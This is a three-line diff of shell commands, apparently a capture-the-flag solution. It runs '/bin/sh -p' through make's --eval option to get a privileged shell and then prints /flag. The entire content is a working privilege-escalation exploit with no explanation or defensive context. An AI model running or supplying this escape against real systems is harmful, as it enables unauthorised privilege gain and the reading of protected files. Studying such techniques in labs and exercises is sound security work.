@@ -1,0 +1,3 @@
+COMMAND='/bin/sh -p'
+make -s --eval=$'x:\n\t-'"$COMMAND"
+cat /flag
